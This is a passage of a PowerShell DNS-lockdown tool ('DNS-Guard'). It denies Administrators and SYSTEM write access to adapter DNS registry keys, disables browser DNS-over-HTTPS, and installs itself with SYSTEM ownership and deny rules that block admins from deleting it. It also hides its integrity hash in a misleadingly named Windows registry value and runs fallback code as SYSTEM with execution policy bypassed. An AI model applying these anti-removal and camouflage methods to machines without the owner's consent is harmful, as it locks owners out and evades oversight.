    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # Master Status Banner Logic
    if ($AllLocked -and $GpoEnforced) { 
        Write-Host " >>> SYSTEM IS SECURE: ZERO-TRUST PADLOCK ACTIVE <<< " -ForegroundColor White -BackgroundColor DarkRed 
    } elseif ($AnyLocked -or $GpoEnforced) {
        Write-Host " >>> SYSTEM IS PARTIALLY SECURE: MIXED STATE <<< " -ForegroundColor Black -BackgroundColor Yellow 
    } else { 
        Write-Host " >>> SYSTEM IS UNSECURE: PADLOCK INACTIVE <<< " -ForegroundColor White -BackgroundColor DarkGreen 
    }
    
    return $AllLocked
}

function Test-IntegrityStatus {
    # Returns $true if installed and hash matches; $false if tampered; $null if not installed
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    if (-not (Test-Path $InstallScript)) { return $null }
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
    if (-not $ExpectedHash -and (Test-Path $IntegrityFile)) { $ExpectedHash = Get-Content -Path $IntegrityFile -Raw }
    if (-not $ExpectedHash) { return $null }
    $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    return ($ExpectedHash.Trim() -eq $ActualHash.Trim())
}

function Harden-RegistryKey {
    param(
        [string]$Path,
        [switch]$IsCurrentUser
    )
    try {
        $Hive = if ($IsCurrentUser) { [Microsoft.Win32.Registry]::CurrentUser } else { [Microsoft.Win32.Registry]::LocalMachine }
        $SubKeyPath = $Path -replace '^HKLM:\\' -replace '^HKCU:\\'
        
        $RegKey = $Hive.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $RegKey) { 
            Write-Log -Message "Registry key not found for hardening: $Path" -Type "WARN" -Color Yellow
            return $false 
        }
        
        $Acl = $RegKey.GetAccessControl()
        
        # Remove inheritance (convert inherited to explicit)
        $Acl.SetAccessRuleProtection($true, $true)
        
        # Remove existing deny rules for the SIDs we will harden
        $RulesToRemove = @()
        foreach ($Rule in $Acl.Access) {
            if ($Rule.AccessControlType -eq "Deny") {
                try {
                    $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                    if ($RuleSid.Value -in @("S-1-5-32-544", "S-1-1-0", "S-1-5-11", "S-1-5-18")) {
                        $RulesToRemove += $Rule
                    }
                } catch {}
            }
        }
        foreach ($Rule in $RulesToRemove) {
            $Acl.RemoveAccessRule($Rule) | Out-Null
        }
        
        # Deny Admins dangerous rights
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Deny Everyone
        $SidEveryone = New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0")
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidEveryone, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Deny Authenticated Users
        $SidAuthUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
        $Acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule($SidAuthUsers, "SetValue,CreateSubkey,Delete,WriteKey", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        $RegKey.SetAccessControl($Acl)
        $RegKey.Close()
        Write-Log -Message "Hardened registry key: $Path" -Type "SUCCESS" -Color Green
        return $true
    } catch {
        Write-Log -Message "Failed to harden registry key $Path`: $_" -Type "WARN" -Color Yellow
        return $false
    }
}

function Restore-RegistryKey {
    param(
        [string]$Path,
        [switch]$IsCurrentUser
    )
    try {
        $Hive = if ($IsCurrentUser) { [Microsoft.Win32.Registry]::CurrentUser } else { [Microsoft.Win32.Registry]::LocalMachine }
        $SubKeyPath = $Path -replace '^HKLM:\\' -replace '^HKCU:\\'
        
        $RegKey = $Hive.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        if (-not $RegKey) { return $false }
        
        $Acl = $RegKey.GetAccessControl()
        
        # Remove deny rules for Admin, Everyone, Authenticated Users, and SYSTEM
        $RulesToRemove = @()
        foreach ($Rule in $Acl.Access) {
            if ($Rule.AccessControlType -eq "Deny") {
                try {
                    $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                    if ($RuleSid.Value -in @("S-1-5-32-544", "S-1-1-0", "S-1-5-11", "S-1-5-18")) {
                        $RulesToRemove += $Rule
                    }
                } catch {}
            }
        }
        
        foreach ($Rule in $RulesToRemove) {
            $Acl.RemoveAccessRule($Rule) | Out-Null
        }
        
        # Re-enable inheritance
        $Acl.SetAccessRuleProtection($false, $false)
        
        $RegKey.SetAccessControl($Acl)
        $RegKey.Close()
        Write-Log -Message "Restored registry key: $Path" -Type "SUCCESS" -Color Green
        return $true
    } catch {
        Write-Log -Message "Direct restore failed for $Path`: $_" -Type "WARN" -Color Yellow
        $FallbackScript = "C:\Windows\Temp\RestoreReg_$([Guid]::NewGuid().ToString()).ps1"
        $PsCode = "try { `$k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('$SubKeyPath', [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions); if (`$k) { `$a = `$k.GetAccessControl(); foreach (`$r in `$a.Access) { if (`$r.AccessControlType -eq 'Deny') { try { `$sid = `$r.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]); if (`$sid.Value -in @('S-1-5-32-544','S-1-1-0','S-1-5-11','S-1-5-18')) { [void]`$a.RemoveAccessRule(`$r) } } catch {} } }; `$a.SetAccessRuleProtection(`$false,`$false); `$k.SetAccessControl(`$a); `$k.Close(); exit 0 } else { exit 1 } } catch { exit 1 }"
        Set-Content -Path $FallbackScript -Value $PsCode -Encoding UTF8 -Force
        $Result = Invoke-AsSystem -Command "powershell.exe -ExecutionPolicy Bypass -File `"$FallbackScript`""
        Remove-Item -Path $FallbackScript -Force -ErrorAction SilentlyContinue
        if ($Result.Success) {
            Write-Log -Message "Restored registry key via SYSTEM: $Path" -Type "SUCCESS" -Color Green
            return $true
        } else {
            Write-Log -Message "Failed to restore registry key via SYSTEM: $Path. Output: $($Result.Output)" -Type "WARN" -Color Yellow
            return $false
        }
    }
}

# ============================================================================
# 4. LOCKDOWN MODULE (ENABLE)
# ============================================================================

function Enable-DNSLock {
    Write-DebugLog -FunctionName "Enable-DNSLock" -Action "ENTRY"
    Write-Log -Message "Initiating Targeted Lock (Admin/SYSTEM Only on IPv4 & IPv6)..." -Type "ACTION" -Color Magenta

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()

                    $Rule1 = New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "SetValue", "Deny")
                    $Rule2 = New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "SetValue", "Deny")

                    $Acl.AddAccessRule($Rule1)
                    $Acl.AddAccessRule($Rule2)

                    $RegKey.SetAccessControl($Acl)
                    Write-Log -Message "Applied lock ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green

                    # Only print raw output if we aren't running silently in the background
                    if (-not $SilentLock) {
                        Write-Host "  > [RAW ACL DUMP FOR $($Adapter.Name) - $Proto]" -ForegroundColor DarkGray
                        $RegKey.GetAccessControl().Access | Where-Object { $_.AccessControlType -eq 'Deny' } | Format-Table IdentityReference, AccessControlType, RegistryRights -AutoSize | Out-String | Write-Host -ForegroundColor DarkGray
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to lock $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Applying visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (-not (Test-Path $GpoPath)) { New-Item -Path $GpoPath -Force -ErrorAction SilentlyContinue | Out-Null }
    Set-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -Value 0 -Force -ErrorAction SilentlyContinue

    Write-Log -Message "Enforcing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    # Edge
    if (!(Test-Path $EdgePath)) { New-Item -Path $EdgePath -Force | Out-Null }
    Set-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -Value "off" -Force
    Set-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -Value 0 -Force
    # Chrome
    if (!(Test-Path $ChromePath)) { New-Item -Path $ChromePath -Force | Out-Null }
    Set-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -Value "off" -Force
    # Firefox
    if (!(Test-Path $FirefoxPath)) { New-Item -Path $FirefoxPath -Force | Out-Null }
    Set-ItemProperty -Path $FirefoxPath -Name "Enabled" -Value 0 -Force

    Write-Log -Message "Resetting Network Stack..." -Type "INFO" -Color Yellow
    ipconfig /flushdns | Out-Null

    # Only force DHCP renewal during interactive runs; avoid network disruption in background task
    if (-not $SilentLock) {
        ipconfig /renew | Out-Null
        Write-Log -Message "Protection deployed. DHCP Lease Renewal Successful!" -Type "SUCCESS" -Color Green
    } else {
        Write-Log -Message "Protection deployed silently (no DHCP renewal in background task)." -Type "SUCCESS" -Color Green
    }

    # Harden registry ACLs to prevent tampering
    Write-Log -Message "Hardening registry ACLs to prevent tampering..." -Type "INFO" -Color Yellow
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid"
        Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
    }
    $null = Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    $null = Harden-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
    $null = Harden-RegistryKey -Path "Software\Policies\Microsoft\Windows\Network Connections" -IsCurrentUser
    $null = Harden-RegistryKey -Path "SOFTWARE\Policies\Microsoft\Edge"
    $null = Harden-RegistryKey -Path "SOFTWARE\Policies\Google\Chrome"
    $null = Harden-RegistryKey -Path "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $HasDeny = $false
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny" -and $Rule.RegistryRights -like "*SetValue*") { $HasDeny = $true }
                        } catch {}
                    }
                    if (-not $HasDeny) { $FailedCount++; Write-Log -Message "Lock missing for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                    $RegKey.Close()
                }
            } catch { $FailedCount++; Write-Log -Message "Could not verify lock for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties not enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Edge DoH not disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Chrome DoH not disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $FailedCount++; Write-Log -Message "Firefox DoH not disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS DEPLOYED!" -ForegroundColor Green
        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Success, FailedCount=0"
    } else {
        Write-Host "[PARTIAL] DNS LOCKS DEPLOYED WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
    }
}

# ============================================================================
# 5. UNLOCK MODULE (DISABLE / ÅNGRA)
# ============================================================================

function Disable-DNSLock {
    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "ENTRY"
    Write-Log -Message "Initiating Total Unlock (Ångra)..." -Type "ACTION" -Color Magenta

    # Restore hardened registry ACLs before attempting to modify values
    Write-Log -Message "Restoring hardened registry ACLs..." -Type "INFO" -Color Yellow
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid"
        $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
    }
    $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
    $null = Restore-RegistryKey -Path "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters"
    $null = Restore-RegistryKey -Path "Software\Policies\Microsoft\Windows\Network Connections" -IsCurrentUser
    $null = Restore-RegistryKey -Path "SOFTWARE\Policies\Microsoft\Edge"
    $null = Restore-RegistryKey -Path "SOFTWARE\Policies\Google\Chrome"
    $null = Restore-RegistryKey -Path "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $RulesToRemove = @()

                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            # Remove locks for Admin, SYSTEM, AND the old Everyone rule just in case it was left behind
                            if (($RuleSid.Value -eq "S-1-5-32-544" -or $RuleSid.Value -eq "S-1-5-18" -or $RuleSid.Value -eq "S-1-1-0") -and $Rule.AccessControlType -eq "Deny") {
                                $RulesToRemove += $Rule
                            }
                        } catch {}
                    }

                    if ($RulesToRemove.Count -gt 0) {
                        foreach ($Rule in $RulesToRemove) { $Acl.RemoveAccessRule($Rule) }
                        $RegKey.SetAccessControl($Acl)
                        Write-Log -Message "Stripped Deny rules ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to read $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Removing visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (Test-Path $GpoPath) {
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -ErrorAction SilentlyContinue
    }

    Write-Log -Message "Removing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    if (Test-Path $EdgePath) {
        Remove-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -ErrorAction SilentlyContinue
    }
    if (Test-Path $ChromePath) { Remove-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue }
    if (Test-Path $FirefoxPath) { Remove-ItemProperty -Path $FirefoxPath -Name "Enabled" -ErrorAction SilentlyContinue }

    ipconfig /flushdns | Out-Null

    Write-Log -Message "System restored to default Windows behaviors." -Type "SUCCESS" -Color Green
    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "EXIT" -Message "Success"

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") { $FailedCount++; Write-Log -Message "Lock still present on adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                        } catch {}
                    }
                    $RegKey.Close()
                }
            } catch { Write-Log -Message "Could not verify unlock for adapter $($Adapter.Name) ($Proto)." -Type "WARN" -Color Yellow }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if ($NetConn -and $NetConn.NC_LanProperties -eq 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties still enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Edge DoH still disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Chrome DoH still disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -eq 0) { $FailedCount++; Write-Log -Message "Firefox DoH still disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS REMOVED!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] DNS LOCKS REMOVED WITH ERRORS! ($FailedCount items still locked)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 6. INSTALLER / PERSISTENCE MODULE (HARDENED)
# ============================================================================

function Install-Persistence {
    Write-DebugLog -FunctionName "Install-Persistence" -Action "ENTRY"
    Export-RawDebugDump -Trigger "DNS_INSTALL_START"
    Write-Log -Message "Installing DNS-Guard to System ($InstallDir)..." -Type "ACTION" -Color Yellow

    # 0. Installation Gate: Prevent overwriting existing installs
    if (Test-Path $InstallDir) {
        Write-Log -Message "Installation aborted: $InstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$TaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    
    # 1. Secure Copy
    if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $InstallScript -Force
    Write-Log -Message "Payload copied to $InstallScript." -Type "INFO" -Color Gray

    # Pre-build wrapper content and create all files inside $InstallDir BEFORE hardening ACLs
    $CmdBatContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$InstallScript`" %*"
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    Out-File -FilePath $CmdPathLocal -InputObject $CmdBatContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $CmdPathLocal." -Type "INFO" -Color Gray

    # Pre-calculate integrity hash and write backup file before hardening
    $ScriptHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    Set-Content -Path $IntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash file written." -Type "INFO" -Color Gray
    
    # --- [NEW] NTFS PAYLOAD SELF-DEFENSE ---
    Write-Log -Message "Hardening NTFS Permissions on installation directory and files..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")

        # Set owner to SYSTEM on directory and all existing files (prevents admin takeown)
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $InstallDir -AclObject $DirAcl
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }

        # Harden directory ACL
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        
        # SYSTEM: FullControl
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        # Admins: ReadAndExecute only (cannot delete, modify, or change permissions)
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        
        # Authenticated Users: ReadAndExecute
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        Set-Acl -Path $InstallDir -AclObject $DirAcl

        # Explicitly harden each file (directory inheritance may not cover existing files perfectly)
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        
        Write-Log -Message "Installation directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS permissions: $_" -Type "ERROR" -Color Red
    }
    # ----------------------------------------
    
    # 2. Build the Global CLI Command (dnslock) in C:\Windows (ASCII encoding, no BOM)
    Out-File -FilePath $CmdPath -InputObject $CmdBatContent -Encoding ASCII -Force
    if (-not (Test-Path $CmdPath)) {
        Write-Log -Message "CRITICAL: Wrapper file was not created at $CmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $CmdPath." -Type "SUCCESS" -Color Green
    }

    # 2.2 Add InstallDir to system PATH so dnslock is discoverable from any shell
    Write-Log -Message "Adding $InstallDir to system PATH..." -Type "INFO" -Color Yellow
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$InstallDir*") {
            $NewPath = $CurrentPath + ";" + $InstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $InstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$InstallDir already in system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update system PATH: $_" -Type "ERROR" -Color Red
    }

    # 2.3 Harden the wrapper files against tampering (but allow all users to execute them)
    Write-Log -Message "Hardening dnslock wrapper files..." -Type "INFO" -Color Yellow
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($CmdPath, $CmdPathLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
